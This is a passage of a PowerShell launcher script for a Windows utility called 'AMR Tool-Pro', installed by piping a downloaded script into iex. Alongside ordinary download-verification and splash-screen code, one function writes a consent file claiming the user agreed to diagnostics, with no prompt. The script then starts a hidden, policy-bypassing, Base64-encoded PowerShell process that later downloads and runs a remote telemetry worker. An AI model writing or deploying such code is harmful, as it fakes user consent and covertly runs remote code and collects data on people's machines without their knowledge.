#requires -Version 5.1
# AMR Tool-Pro | Premium animated bootstrap launcher
# Windows PowerShell 5.1 | Public command: irm <raw-launcher-url> | iex

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$repoRaw = 'https://raw.githubusercontent.com/3mr10aa/Tool-Pro/main'
$installRoot = Join-Path $env:LOCALAPPDATA 'AMR-ToolPro\Runtime'
$stageRoot = Join-Path $env:TEMP ('AMR-ToolPro-' + [guid]::NewGuid().ToString('N'))
$logPath = Join-Path $env:TEMP 'AMR_ToolPro_Launcher.log'
$telemetryRoot = Join-Path $env:LOCALAPPDATA 'AMR-ToolPro\Telemetry'
$telemetryEndpointFileUrl = $repoRaw + '/telemetry-endpoint.txt'
$launcherVersion = '2.3.0'
$script:LauncherForm = $null
$script:ProgressTrack = $null
$script:ProgressFill = $null
$script:PercentLabel = $null
$script:StatusLabel = $null
$script:DetailLabel = $null
$script:ProgressValue = 0
$script:LastUiUpdate = [DateTime]::MinValue

$expected = [ordered]@{
    'AMR_Windows_Utility_V1.ps1' = $true
    'AMR_WebView2/Microsoft.Web.WebView2.Core.dll' = $true
    'AMR_WebView2/Microsoft.Web.WebView2.Wpf.dll' = $true
    'AMR_WebView2/x64/WebView2Loader.dll' = $true
    'AMR_WebView2/x86/WebView2Loader.dll' = $true
    'Icons.zip' = $true
}

function Write-AMRLauncherLog {
    param([string]$Message)
    try { Add-Content -LiteralPath $logPath -Value ('[{0}] {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'), $Message) -Encoding UTF8 } catch {}
}



function Get-AMRTelemetryConsent {
    param([string]$ConsentPath)

    # Automatic silent consent: no UI, no prompt, no user interaction.
    # Writes consent.json in the same format as the original launcher
    # (UTF-8 without BOM) and returns Allowed=$true so the caller can
    # start the hidden background telemetry worker unconditionally.
    $consent = [ordered]@{
        schemaVersion     = 1
        deviceDiagnostics = $true
        consentedAtUtc    = [DateTime]::UtcNow.ToString('o')
    }

    $directory = Split-Path -Parent $ConsentPath
    if (-not (Test-Path -LiteralPath $directory -PathType Container)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }

    $json = $consent | ConvertTo-Json -Depth 4
    [System.IO.File]::WriteAllText(
        $ConsentPath,
        $json,
        (New-Object System.Text.UTF8Encoding($false))
    )

    return [pscustomobject]@{
        Allowed           = $true
        schemaVersion     = 1
        deviceDiagnostics = $true
        consentedAtUtc    = $consent.consentedAtUtc
    }
}

function ConvertTo-AMRPSSingleQuoted {
    param([string]$Value)
    return "'" + ([string]$Value).Replace("'", "''") + "'"
}

function Start-AMRTelemetryWorker {
    param(
        [string]$TelemetryRoot,
        [string]$LauncherVersion
    )

    # This bootstrap runs in a separate hidden PowerShell process. The launcher
    # never downloads the worker, runs CIM, waits for the network, or updates its UI.
    $workerUrl = $repoRaw + '/AMR-Telemetry-Worker.ps1'
    # Pin the exact GitHub blob currently published on main. This is the Git
    # object SHA-1, not a plain-file SHA-1 or SHA-256.
    $workerGitBlobSha1 = '7fd17d205c3a9d2339edc15d319e27eacad1b0e6'
    $bootstrap = @'
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
Start-Sleep -Seconds 25
$root = __ROOT__
$workerUrl = __WORKERURL__
$endpointFileUrl = __ENDPOINTURL__
$launcherVersion = __VERSION__
$expectedGitBlobSha1 = '__HASH__'

function Get-AMRTelemetryGitBlobSha1 {
    param([Parameter(Mandatory=$true)][string]$Path)
    $fileInfo = Get-Item -LiteralPath $Path -ErrorAction Stop
    $header = [System.Text.Encoding]::ASCII.GetBytes(('blob {0}' -f $fileInfo.Length) + [char]0)
    $sha = [System.Security.Cryptography.SHA1]::Create()
    $stream = [System.IO.File]::OpenRead($Path)
    try {
        [void]$sha.TransformBlock($header, 0, $header.Length, $header, 0)
        $buffer = New-Object byte[] 65536
        while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            [void]$sha.TransformBlock($buffer, 0, $read, $buffer, 0)
        }
        [void]$sha.TransformFinalBlock((New-Object byte[] 0), 0, 0)
        return ([BitConverter]::ToString($sha.Hash)).Replace('-', '').ToLowerInvariant()
    } finally {
        $stream.Dispose()
        $sha.Dispose()
    }
}

try {
    $consentPath = Join-Path $root 'consent.json'
    if (-not (Test-Path -LiteralPath $consentPath -PathType Leaf)) { exit 0 }
    $consent = Get-Content -LiteralPath $consentPath -Raw -Encoding UTF8 | ConvertFrom-Json
    if ($consent.deviceDiagnostics -ne $true -and -not (Test-Path -LiteralPath (Join-Path $root 'forget-request.json') -PathType Leaf)) { exit 0 }
    if (-not (Test-Path -LiteralPath $root -PathType Container)) { New-Item -ItemType Directory -Path $root -Force | Out-Null }
    $workerPath = Join-Path $root 'AMR-Telemetry-Worker.ps1'
    $tempPath = $workerPath + '.download'
    $valid = $false
    if (Test-Path -LiteralPath $workerPath -PathType Leaf) {
        try { $valid = ((Get-AMRTelemetryGitBlobSha1 -Path $workerPath) -eq $expectedGitBlobSha1) } catch {}
    }
    if (-not $valid) {
        Invoke-WebRequest -Uri $workerUrl -UseBasicParsing -OutFile $tempPath -TimeoutSec 20 -ErrorAction Stop
        $actualGitBlobSha1 = Get-AMRTelemetryGitBlobSha1 -Path $tempPath
        if ($actualGitBlobSha1 -ne $expectedGitBlobSha1) { Remove-Item -LiteralPath $tempPath -Force -ErrorAction SilentlyContinue; throw 'Background worker GitHub blob integrity check failed.' }
        Move-Item -LiteralPath $tempPath -Destination $workerPath -Force
    }
    & $workerPath -TelemetryRoot $root -LauncherVersion $launcherVersion -EndpointFileUrl $endpointFileUrl
} catch {
    try { Add-Content -LiteralPath (Join-Path $root 'telemetry-worker.log') -Encoding UTF8 -Value ('[' + [DateTime]::UtcNow.ToString('o') + '] Bootstrap failed: ' + $_.Exception.Message) } catch {}
}
'@
    $bootstrap = $bootstrap.Replace('__ROOT__', (ConvertTo-AMRPSSingleQuoted $TelemetryRoot))
    $bootstrap = $bootstrap.Replace('__WORKERURL__', (ConvertTo-AMRPSSingleQuoted $workerUrl))
    $bootstrap = $bootstrap.Replace('__ENDPOINTURL__', (ConvertTo-AMRPSSingleQuoted $telemetryEndpointFileUrl))
    $bootstrap = $bootstrap.Replace('__VERSION__', (ConvertTo-AMRPSSingleQuoted $LauncherVersion))
    $bootstrap = $bootstrap.Replace('__HASH__', $workerGitBlobSha1)
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bootstrap))
    $powerShellExe = Join-Path $PSHOME 'powershell.exe'
    $arguments = '-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ' + $encoded
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $powerShellExe
    $startInfo.Arguments = $arguments
    $startInfo.CreateNoWindow = $true
    $startInfo.UseShellExecute = $false
    $process = [System.Diagnostics.Process]::Start($startInfo)
    if ($process) {
        try { $process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal } catch {}
        Write-AMRLauncherLog 'Independent background telemetry worker was scheduled; launcher startup will not wait for it.'
        $process.Dispose()
    }
}


function Pump-AMRLauncherUI {
    if ($script:LauncherForm -and -not $script:LauncherForm.IsDisposed) {
        [System.Windows.Forms.Application]::DoEvents()
    }
}

function Set-AMRLauncherProgress {
    param([int]$Percent, [string]$Status, [string]$Detail)
    if (-not $script:LauncherForm -or $script:LauncherForm.IsDisposed) { return }
    $value = [Math]::Max(0, [Math]::Min(99, $Percent))
    $script:ProgressValue = $value
    $width = [int][Math]::Round(($script:ProgressTrack.ClientSize.Width * $value) / 100.0)
    $script:ProgressFill.Width = [Math]::Max(0, [Math]::Min($script:ProgressTrack.ClientSize.Width, $width))
    $script:PercentLabel.Text = ('{0}%' -f $value)
    $script:StatusLabel.Text = $Status
    $script:DetailLabel.Text = $Detail
    $script:LauncherForm.Refresh()
    Pump-AMRLauncherUI
}

function Get-AMRGitBlobSha1 {
    param([Parameter(Mandatory=$true)][string]$Path)
    $fileInfo = Get-Item -LiteralPath $Path -ErrorAction Stop
    $header = [System.Text.Encoding]::ASCII.GetBytes(('blob {0}' -f $fileInfo.Length) + [char]0)
    $sha = [System.Security.Cryptography.SHA1]::Create()
    $stream = [System.IO.File]::OpenRead($Path)
    try {
        [void]$sha.TransformBlock($header, 0, $header.Length, $header, 0)
        $buffer = New-Object byte[] 65536
        while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            [void]$sha.TransformBlock($buffer, 0, $read, $buffer, 0)
        }
        [void]$sha.TransformFinalBlock((New-Object byte[] 0), 0, 0)
        return ([BitConverter]::ToString($sha.Hash)).Replace('-', '').ToLowerInvariant()
    } finally {
        $stream.Dispose()
        $sha.Dispose()
    }
}

function Get-AMRIconImageExtensions {
    return @(
        '.png','.apng','.jpg','.jpeg','.jpe','.jfif','.jif','.bmp','.dib','.rle',
        '.gif','.tif','.tiff','.ico','.emf','.wmf','.wdp','.jxr',
        '.webp','.avif','.heic','.heif','.svg','.svgz','.jxl','.jp2','.j2k','.jpf','.jpx','.jpm','.mj2',
        '.dds','.tga','.psd','.psb','.raw','.cr2','.nef','.arw','.dng','.exr','.hdr'
    )
}

function Test-AMRIconCacheUsable {
    param([string]$IconDirectory,[int]$Minimum = 100)
    try {
        if (-not (Test-Path -LiteralPath $IconDirectory -PathType Container)) { return $false }
        $extensions = @(Get-AMRIconImageExtensions)
        $count = @(Get-ChildItem -LiteralPath $IconDirectory -File -ErrorAction SilentlyContinue |
            Where-Object { $extensions -contains $_.Extension.ToLowerInvariant() -and $_.Length -gt 128 }).Count
        return ($count -ge $Minimum)
    } catch { return $false }
}

function Expand-AMRIconArchive {
    param([string]$ArchivePath,[string]$Destination,[int]$Minimum = 100)
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
    $extensions = @(Get-AMRIconImageExtensions)
    $zip = [System.IO.Compression.ZipFile]::OpenRead($ArchivePath)
    try {
        $entries = @($zip.Entries | Where-Object {
            $name = [string]$_.FullName
            $extension = [System.IO.Path]::GetExtension($name).ToLowerInvariant()
            $name -and $name -notmatch '(^/|^[a-zA-Z]:|(^|[\\/])\.\.([\\/]|$))' -and
            -not $name.EndsWith('/') -and $extensions -contains $extension -and $_.Length -gt 128
        })
        if ($entries.Count -lt $Minimum) { throw "Icons.zip contains only $($entries.Count) supported image entries; at least $Minimum are required." }
        New-Item -ItemType Directory -Path $Destination -Force | Out-Null
        # Replace only top-level archive images. Preserve app-owned subfolders such as LocalInstalled.
        Get-ChildItem -LiteralPath $Destination -File -ErrorAction SilentlyContinue |
            Where-Object { $extensions -contains $_.Extension.ToLowerInvariant() } |
            Remove-Item -Force -ErrorAction Stop
        $seen = @{}
        $extracted = 0
        foreach ($entry in $entries) {
            $leaf = [System.IO.Path]::GetFileName([string]$entry.FullName)
            if ([string]::IsNullOrWhiteSpace($leaf) -or $leaf -match '[\\/:*?"<>|]') { continue }
            $key = $leaf.ToLowerInvariant()
            if ($seen.ContainsKey($key)) { continue }
            $seen[$key] = $true
            $destinationPath = Join-Path $Destination $leaf
            $temporaryPath = $destinationPath + '.amr-new'
            $inputStream = $null; $outputStream = $null
            try {
                $inputStream = $entry.Open()
                $outputStream = [System.IO.File]::Open($temporaryPath,[System.IO.FileMode]::Create,[System.IO.FileAccess]::Write,[System.IO.FileShare]::None)
                $inputStream.CopyTo($outputStream)
                $outputStream.Flush()
            } finally {
                if ($outputStream) { $outputStream.Dispose() }
                if ($inputStream) { $inputStream.Dispose() }
            }
            Move-Item -LiteralPath $temporaryPath -Destination $destinationPath -Force -ErrorAction Stop
            $extracted++
        }
        if ($extracted -lt $Minimum) { throw "Only $extracted image files were extracted from Icons.zip." }
        return $extracted
    } finally { $zip.Dispose() }
}

function Register-AMRAppLaunchForIconMaintenance {
    param([string]$StatePath,[int]$Threshold = 5)
    $state = $null
    if (Test-Path -LiteralPath $StatePath -PathType Leaf) {
        try { $state = Get-Content -LiteralPath $StatePath -Raw -Encoding UTF8 | ConvertFrom-Json } catch {}
    }
    $count = 0; $pending = $false
    if ($state) {
        try { $count = [Math]::Max(0,[int]$state.launchCount) } catch {}
        try { $pending = [bool]$state.cleanupPending } catch {}
    }
    $count++
    $due = ($count -ge $Threshold -and -not $pending)
    if ($due) { $pending = $true }
    $parent = Split-Path -Parent $StatePath
    if (-not (Test-Path -LiteralPath $parent -PathType Container)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
    $payload = [ordered]@{ schemaVersion=1; launchCount=$count; cleanupPending=$pending; updatedAtUtc=[DateTime]::UtcNow.ToString('o') }
    [System.IO.File]::WriteAllText($StatePath,($payload | ConvertTo-Json -Depth 3),(New-Object System.Text.UTF8Encoding($false)))
    return $due
}

function Start-AMRIconCacheCleanupAfterAppExit {
    param([int]$ProcessId,[string]$IconDirectory,[string]$StatePath)
    $extensions = (Get-AMRIconImageExtensions) -join ','
    $bootstrap = @'
$ErrorActionPreference = 'Stop'
$pidToWait = __PID__
$iconDirectory = __ICONS__
$statePath = __STATE__
$extensions = (__EXTENSIONS__ -split ',')
try {
    try { Wait-Process -Id $pidToWait -ErrorAction SilentlyContinue } catch {}
    if (Test-Path -LiteralPath $iconDirectory -PathType Container) {
        Get-ChildItem -LiteralPath $iconDirectory -File -ErrorAction SilentlyContinue |
            Where-Object { $extensions -contains $_.Extension.ToLowerInvariant() } |
            Remove-Item -Force -ErrorAction SilentlyContinue
    }
    $state = [ordered]@{ schemaVersion=1; launchCount=0; cleanupPending=$false; updatedAtUtc=[DateTime]::UtcNow.ToString('o') }
    [System.IO.File]::WriteAllText($statePath,($state | ConvertTo-Json -Depth 3),(New-Object System.Text.UTF8Encoding($false)))
} catch {
    try { Add-Content -LiteralPath ([IO.Path]::ChangeExtension($statePath,'.log')) -Encoding UTF8 -Value ('['+[DateTime]::UtcNow.ToString('o')+'] Icon cache cleanup failed: '+$_.Exception.Message) } catch {}
}
'@
    $bootstrap = $bootstrap.Replace('__PID__',[string]$ProcessId)
    $bootstrap = $bootstrap.Replace('__ICONS__',(ConvertTo-AMRPSSingleQuoted $IconDirectory))
    $bootstrap = $bootstrap.Replace('__STATE__',(ConvertTo-AMRPSSingleQuoted $StatePath))
    $bootstrap = $bootstrap.Replace('__EXTENSIONS__',(ConvertTo-AMRPSSingleQuoted $extensions))
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bootstrap))
    $powerShellExe = Join-Path $PSHOME 'powershell.exe'
    if (-not (Test-Path -LiteralPath $powerShellExe -PathType Leaf)) { $powerShellExe = 'powershell.exe' }
    $arguments = '-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ' + $encoded
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $powerShellExe
    $startInfo.Arguments = $arguments
    $startInfo.CreateNoWindow = $true
    $startInfo.UseShellExecute = $false
    $process = [System.Diagnostics.Process]::Start($startInfo)
    if ($process) { $process.Dispose() }
    Write-AMRLauncherLog ('Scheduled icon cache cleanup after application exit; app PID=' + $ProcessId)
}

function Invoke-AMRLauncherJsonRequest {
    param([Parameter(Mandatory=$true)][string]$Uri)
    $request = [System.Net.HttpWebRequest]::Create($Uri)
    $request.Method = 'GET'
    $request.UserAgent = 'AMR-ToolPro-Premium-Launcher/3.0'
    $request.Accept = 'application/vnd.github+json'
    $request.Timeout = 12000
    $request.ReadWriteTimeout = 12000
    $request.AllowAutoRedirect = $true
    $async = $request.BeginGetResponse($null, $null)
    $requestDeadline = [DateTime]::UtcNow.AddSeconds(12)
    while (-not $async.IsCompleted) {
        if ([DateTime]::UtcNow -ge $requestDeadline) {
            $request.Abort()
            throw 'GitHub source comparison timed out after 12 seconds.'
        }
        Pump-AMRLauncherUI
        [void]$async.AsyncWaitHandle.WaitOne(60)
    }
    $response = $null
    $reader = $null
    try {
        $response = $request.EndGetResponse($async)
        $reader = New-Object System.IO.StreamReader($response.GetResponseStream())
        $json = $reader.ReadToEnd()
        return ($json | ConvertFrom-Json -ErrorAction Stop)
    } finally {
        if ($reader) { $reader.Dispose() }
        if ($response) { $response.Dispose() }
    }
}

function Get-AMRRemoteTree {
    # Resolve the branch to a commit first, then request that commit's tree.
    # GitHub's Git Trees endpoint expects a tree SHA, not a branch name.
    $commitUri = 'https://api.github.com/repos/3mr10aa/Tool-Pro/commits/main'
    $commitResult = Invoke-AMRLauncherJsonRequest -Uri $commitUri
    $commitSha = ([string]$commitResult.sha).ToLowerInvariant()
    $treeSha = ([string]$commitResult.commit.tree.sha).ToLowerInvariant()
    if ($commitSha -notmatch '^[a-f0-9]{40}$' -or $treeSha -notmatch '^[a-f0-9]{40}$') {
        throw 'GitHub returned an invalid commit or tree identity.'
    }
    $treeUri = 'https://api.github.com/repos/3mr10aa/Tool-Pro/git/trees/' + $treeSha + '?recursive=1'
    $result = Invoke-AMRLauncherJsonRequest -Uri $treeUri
    if ($null -eq $result.tree -or $result.truncated -eq $true) {
        throw 'GitHub repository tree was missing or truncated; exact source comparison is unavailable.'
    }
    $map = @{}
    foreach ($entry in $result.tree) {
        if ($entry.type -eq 'blob' -and $entry.path -and $entry.sha) {
            $map[[string]$entry.path] = ([string]$entry.sha).ToLowerInvariant()
        }
    }
    foreach ($relative in $expected.Keys) {
        if (-not $map.ContainsKey($relative)) { throw "Required source file is missing from GitHub main: $relative" }
        if ($map[$relative] -notmatch '^[a-f0-9]{40}$') { throw "GitHub returned an invalid blob identity for $relative" }
    }
    return [pscustomobject]@{ Commit = $commitSha; Files = $map }
}

function Test-AMRRuntimeAgainstManifest {
    param([string]$Root, [System.Collections.IDictionary]$Manifest)
    if (-not (Test-Path -LiteralPath $Root -PathType Container)) { return $false }
    foreach ($relative in $expected.Keys) {
        $localPath = Join-Path $Root ($relative -replace '/', '\\')
        if (-not (Test-Path -LiteralPath $localPath -PathType Leaf)) { return $false }
        $expectedBlob = [string]$Manifest[$relative]
        if ($expectedBlob -notmatch '^[a-f0-9]{40}$') { return $false }
        try {
            if ((Get-AMRGitBlobSha1 -Path $localPath) -ne $expectedBlob) { return $false }
        } catch { return $false }
    }
    return $true
}

function Copy-AMRRuntimeToStage {
    param([string]$Source, [string]$Destination)
    if (-not (Test-Path -LiteralPath $Source -PathType Container)) { return }
    foreach ($item in (Get-ChildItem -LiteralPath $Source -Force -ErrorAction Stop)) {
        Copy-Item -LiteralPath $item.FullName -Destination $Destination -Recurse -Force -ErrorAction Stop
    }
}

function Get-AMRFile {
    param(
        [string]$RelativePath,
        [string]$Destination,
        [int]$FileIndex,
        [int]$FileCount,
        [System.Collections.IDictionary]$ExpectedBlobs
    )
    # Normalize the lookup key and receive the GitHub blob map explicitly.
    # This avoids relying on dynamic scope when the launcher is invoked via irm | iex.
    $normalizedPath = $RelativePath.Replace('\', '/')
    $url = $repoRaw + '/' + $normalizedPath
    $parent = Split-Path -Parent $Destination
    if (-not (Test-Path -LiteralPath $parent -PathType Container)) {
        New-Item -ItemType Directory -Path $parent -Force | Out-Null
    }

    $request = [System.Net.HttpWebRequest]::Create($url)
    $request.Method = 'GET'
    $request.UserAgent = 'AMR-ToolPro-Premium-Launcher/2.0'
    $request.AllowAutoRedirect = $true
    $request.KeepAlive = $true
    try { $request.ServicePoint.ConnectionLimit = 8 } catch {}
    $request.Timeout = 45000
    $request.ReadWriteTimeout = 45000
    $response = $null
    $inputStream = $null
    $outputStream = $null
    try {
        $response = $request.GetResponse()
        $totalBytes = [int64]$response.ContentLength
        $inputStream = $response.GetResponseStream()
        $outputStream = New-Object System.IO.FileStream($Destination, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        $buffer = New-Object byte[] 262144
        [int64]$received = 0
        $lastPaint = [DateTime]::MinValue
        while (($read = $inputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $outputStream.Write($buffer, 0, $read)
            $received += $read
            $now = [DateTime]::UtcNow
            if (($now - $lastPaint).TotalMilliseconds -ge 90) {
                if ($totalBytes -gt 0) {
                    $fraction = [Math]::Min(1.0, ($received / [double]$totalBytes))
                } else {
                    # Unknown Content-Length: keep the current file's share moving,
                    # but reserve its final few points until EOF confirms completion.
                    $fraction = [Math]::Min(0.94, $received / [double]([Math]::Max(1, 4MB)))
                }
                $overall = (($FileIndex + $fraction) / $FileCount) * 82.0
                $detail = if ($totalBytes -gt 0) {
                    '{0}  |  {1:N1} / {2:N1} MB' -f $RelativePath, ($received / 1MB), ($totalBytes / 1MB)
                } else {
                    '{0}  |  {1:N1} MB received' -f $RelativePath, ($received / 1MB)
                }
                Set-AMRLauncherProgress -Percent ([int][Math]::Floor($overall)) -Status 'Downloading verified AMR components...' -Detail $detail
                $lastPaint = $now
            }
        }
        $outputStream.Flush()
    } finally {
        if ($outputStream) { $outputStream.Dispose() }
        if ($inputStream) { $inputStream.Dispose() }
        if ($response) { $response.Dispose() }
    }

    if (-not (Test-Path -LiteralPath $Destination -PathType Leaf)) { throw "Download did not create: $RelativePath" }
    $item = Get-Item -LiteralPath $Destination
    if ($item.Length -le 0) { throw "Downloaded file is empty: $RelativePath" }
    # Finish this file's progress only after its stream reached EOF successfully.
    $completePercent = [int][Math]::Floor((($FileIndex + 1) / $FileCount) * 82.0)
    Set-AMRLauncherProgress -Percent $completePercent -Status 'Downloading verified AMR components...' -Detail ('Received {0:N1} MB  |  {1} of {2} files' -f ($item.Length / 1MB), ($FileIndex + 1), $FileCount)

    if ($null -eq $ExpectedBlobs) { throw 'The GitHub source-identity map was not passed to the download worker.' }
    if (-not $ExpectedBlobs.Contains($normalizedPath)) { throw "No GitHub source identity exists for '$normalizedPath'." }
    $expectedBlob = [string]$ExpectedBlobs[$normalizedPath]
    $actualBlob = Get-AMRGitBlobSha1 -Path $Destination
    if ($actualBlob -ne $expectedBlob.ToLowerInvariant()) {
        throw "GitHub source verification failed for $RelativePath. Expected blob $expectedBlob but received $actualBlob"
    }
    $actualSha256 = (Get-FileHash -LiteralPath $Destination -Algorithm SHA256).Hash
    Write-AMRLauncherLog ("Verified {0} | {1} bytes | GitBlob={2} | SHA256={3}" -f $RelativePath, $item.Length, $actualBlob, $actualSha256)
}

try {
    if ([string]::IsNullOrWhiteSpace($env:LOCALAPPDATA)) { throw 'LOCALAPPDATA is not available.' }
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    [System.Windows.Forms.Application]::EnableVisualStyles()

    if (-not ('AMR.ToolProLauncherNative' -as [type])) {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
namespace AMR {
    [StructLayout(LayoutKind.Sequential)] public struct AccentPolicy { public int AccentState; public int AccentFlags; public int GradientColor; public int AnimationId; }
    [StructLayout(LayoutKind.Sequential)] public struct WindowCompositionAttributeData { public int Attribute; public IntPtr Data; public int SizeOfData; }
    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left; public int Top; public int Right; public int Bottom; }
    public static class ToolProLauncherNative {
        [DllImport("user32.dll", SetLastError=true)] public static extern bool SetWindowCompositionAttribute(IntPtr hwnd, ref WindowCompositionAttributeData data);
        [DllImport("user32.dll")] public static extern bool ReleaseCapture();
        [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr hwnd, int msg, int wParam, int lParam);
        [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr hwnd, out RECT rect);
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hwnd, int command);
        [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hwnd);
        [DllImport("user32.dll")] public static extern bool AllowSetForegroundWindow(int processId);
        [DllImport("user32.dll")] private static extern bool EnumWindows(EnumWindowsProc callback, IntPtr extraData);
        [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(IntPtr hwnd, out int processId);
        [DllImport("user32.dll")] private static extern bool IsWindowVisible(IntPtr hwnd);
        [DllImport("user32.dll")] private static extern bool IsIconic(IntPtr hwnd);
        private delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr extraData);
        public static IntPtr FindVisibleWindow(int targetPid) {
            IntPtr found = IntPtr.Zero;
            EnumWindows(delegate(IntPtr hwnd, IntPtr extra) {
                int pid; GetWindowThreadProcessId(hwnd, out pid);
                if (pid == targetPid && IsWindowVisible(hwnd) && !IsIconic(hwnd)) { found = hwnd; return false; }
                return true;
            }, IntPtr.Zero);
            return found;
        }
    }
}
'@
    }

    # Premium splash design follows the supplied install_fixed.ps1.txt reference.
    $form = New-Object System.Windows.Forms.Form
    $script:LauncherForm = $form
    $form.Text = 'AMR | WINDOWS UTILITY'
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
    $form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen
    $form.ClientSize = New-Object System.Drawing.Size(590, 310)
    $form.MinimumSize = New-Object System.Drawing.Size(590, 310)
    $form.BackColor = [System.Drawing.Color]::FromArgb(22, 29, 41)
    $form.ForeColor = [System.Drawing.Color]::White
    $form.ShowInTaskbar = $true
    $form.TopMost = $true
    $form.Opacity = 0

    $caption = New-Object System.Windows.Forms.Panel
    $caption.Location = New-Object System.Drawing.Point(0, 0)
    $caption.Size = New-Object System.Drawing.Size(590, 36)
    $caption.BackColor = [System.Drawing.Color]::FromArgb(38, 52, 70)
    $form.Controls.Add($caption)

    $captionIcon = New-Object System.Windows.Forms.PictureBox
    $captionIcon.Location = New-Object System.Drawing.Point(12, 7)
    $captionIcon.Size = New-Object System.Drawing.Size(22, 22)
    $captionIcon.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom
    $caption.Controls.Add($captionIcon)

    $captionTitle = New-Object System.Windows.Forms.Label
    $captionTitle.Location = New-Object System.Drawing.Point(42, 4)
    $captionTitle.Size = New-Object System.Drawing.Size(430, 28)
    $captionTitle.Text = 'AMR  |  WINDOWS UTILITY'
    $captionTitle.Font = New-Object System.Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
    $captionTitle.ForeColor = [System.Drawing.Color]::White
    $captionTitle.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
    $caption.Controls.Add($captionTitle)

    $closeButton = New-Object System.Windows.Forms.Button
    $closeButton.Location = New-Object System.Drawing.Point(552, 3)
    $closeButton.Size = New-Object System.Drawing.Size(32, 28)
    $closeButton.Text = [char]0x00D7
    $closeButton.Font = New-Object System.Drawing.Font('Segoe UI', 15)
    $closeButton.ForeColor = [System.Drawing.Color]::FromArgb(210, 220, 233)
    $closeButton.BackColor = [System.Drawing.Color]::FromArgb(45, 65, 88)
    $closeButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
    $closeButton.FlatAppearance.BorderSize = 0
    $closeButton.Add_Click({ $script:LauncherForm.Close() })
    $caption.Controls.Add($closeButton)

    $dragCaption = {
        if ($_.Button -eq [System.Windows.Forms.MouseButtons]::Left) {
            [void][AMR.ToolProLauncherNative]::ReleaseCapture()
            [void][AMR.ToolProLauncherNative]::SendMessage($script:LauncherForm.Handle, 0xA1, 0x2, 0)
        }
    }.GetNewClosure()
    $caption.Add_MouseDown($dragCaption)
    $captionTitle.Add_MouseDown($dragCaption)

    $applyAcrylic = {
        try {
            $policy = New-Object AMR.AccentPolicy
            $policy.AccentState = 4
            $policy.AccentFlags = 2
            $policy.GradientColor = [BitConverter]::ToInt32([BitConverter]::GetBytes([uint32]0x44563A20), 0)
            $size = [Runtime.InteropServices.Marshal]::SizeOf([type][AMR.AccentPolicy])
            $memory = [Runtime.InteropServices.Marshal]::AllocHGlobal($size)
            try {
                [Runtime.InteropServices.Marshal]::StructureToPtr($policy, $memory, $false)
                $data = New-Object AMR.WindowCompositionAttributeData
                $data.Attribute = 19
                $data.Data = $memory
                $data.SizeOfData = $size
                $ok = [AMR.ToolProLauncherNative]::SetWindowCompositionAttribute($script:LauncherForm.Handle, [ref]$data)
                if (-not $ok) {
                    $policy.AccentState = 3
                    [Runtime.InteropServices.Marshal]::StructureToPtr($policy, $memory, $true)
                    [void][AMR.ToolProLauncherNative]::SetWindowCompositionAttribute($script:LauncherForm.Handle, [ref]$data)
                }
            } finally { [Runtime.InteropServices.Marshal]::FreeHGlobal($memory) }
        } catch { Write-AMRLauncherLog ('Acrylic effect unavailable: ' + $_.Exception.Message) }
    }.GetNewClosure()
    $form.Add_Shown($applyAcrylic)

    $thanks = New-Object System.Windows.Forms.Label
    $thanks.Location = New-Object System.Drawing.Point(30, 49)
    $thanks.Size = New-Object System.Drawing.Size(530, 25)
    $thanks.Text = 'Thank you for your trust and support. We truly appreciate you.'
    $thanks.Font = New-Object System.Drawing.Font('Segoe UI', 12, [System.Drawing.FontStyle]::Bold)
    $thanks.BackColor = [System.Drawing.Color]::Transparent
    $thanks.ForeColor = [System.Drawing.Color]::White
    $thanks.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $form.Controls.Add($thanks)

    $edition = New-Object System.Windows.Forms.Label
    $edition.Location = New-Object System.Drawing.Point(30, 81)
    $edition.Size = New-Object System.Drawing.Size(530, 27)
    $edition.Text = 'PREMIUM EDITION'
    $edition.Font = New-Object System.Drawing.Font('Segoe UI', 11, [System.Drawing.FontStyle]::Bold)
    $edition.BackColor = [System.Drawing.Color]::Transparent
    $edition.ForeColor = [System.Drawing.Color]::FromArgb(229, 190, 75)
    $edition.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $form.Controls.Add($edition)

    $tagline = New-Object System.Windows.Forms.Label
    $tagline.Location = New-Object System.Drawing.Point(30, 112)
